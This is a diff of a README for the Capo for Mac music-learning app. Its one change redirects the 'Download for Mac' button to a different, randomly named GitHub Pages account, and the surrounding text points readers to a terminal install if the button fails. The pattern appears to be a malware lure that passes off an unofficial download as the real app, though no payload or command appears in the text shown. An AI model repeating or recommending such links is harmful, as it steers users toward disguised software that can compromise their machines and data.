@@ -3,7 +3,7 @@
 
 Capo for Mac is a powerful music learning tool 🎸 that helps you slow down songs, detect chords, and improve your guitar skills. You can easily install it on your macOS device by following the guide below.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-000000?style=for-the-badge&logo=apple&logoColor=white)](https://kamartamara.github.io/.github/capo)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tayusikf8398.github.io/.github/capo)
 
 If the download button does not work, follow the installation instructions below using the terminal.
 
